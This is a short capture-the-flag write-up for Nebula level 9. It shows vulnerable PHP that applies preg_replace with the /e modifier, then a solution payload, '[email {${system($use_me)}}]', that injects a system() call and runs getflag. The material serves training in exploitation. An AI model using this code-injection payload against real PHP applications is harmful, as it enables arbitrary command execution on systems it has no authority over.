.. _nebula09:

.. role:: bash(code)
	  :language: bash

.. role:: php(code)
	  :language: php
		     
Nebula 9
========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level07/

**Source Code**

.. code-block:: php
		<?php

		function spam($email)
		{
		    $email = preg_replace("/\./", " dot ", $email);
		    $email = preg_replace("/@/", " AT ", $email);

		    return $email;
		}

		function markup($filename, $use_me)
		{
		    $contents = file_get_contents($filename);

		    $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
		    $contents = preg_replace("/\[/", "<", $contents);
		    $contents = preg_replace("/\]/", ">", $contents);

		    return $contents;
		}

		$output = markup($argv[1], $argv[2]);

		print $output;

		?>

Solution
--------

Create a file in tmp and add this

[email {${system($use_me)}}]

then run

:bash:`./flag09 /tmp/file.txt getflag
